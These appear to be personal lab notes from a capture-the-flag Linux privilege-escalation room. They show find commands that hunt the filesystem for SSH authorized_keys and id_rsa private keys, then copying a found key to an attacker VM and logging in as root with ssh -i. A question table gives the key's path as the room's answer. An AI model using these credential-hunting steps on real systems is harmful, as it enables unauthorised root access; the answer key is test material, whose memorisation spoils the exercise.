Detection

Linux VM

1. In command prompt type:

```
find / -name authorized_keys 2> /dev/null
```

2. In a command prompt type:

```
find / -name id_rsa 2> /dev/null
```

3. Note the results.

![[Pasted image 20240601203713.png]]


Exploitation

Linux VM

1. Copy the contents of the discovered id_rsa file to a file on your attacker VM.

Attacker VM  

1. In command prompt type: chmod 400 id_rsa

2. In command prompt type: 

```
ssh -i id_rsa root@<ip>
```


You should now have a root shell :)

![[Pasted image 20240601204027.png]]


Answer the questions below

| Question                                                        | Answer                          |
| --------------------------------------------------------------- | ------------------------------- |
| What's the full file path of the sensitive file you discovered? | /backups/supersecretkeys/id_rsa |
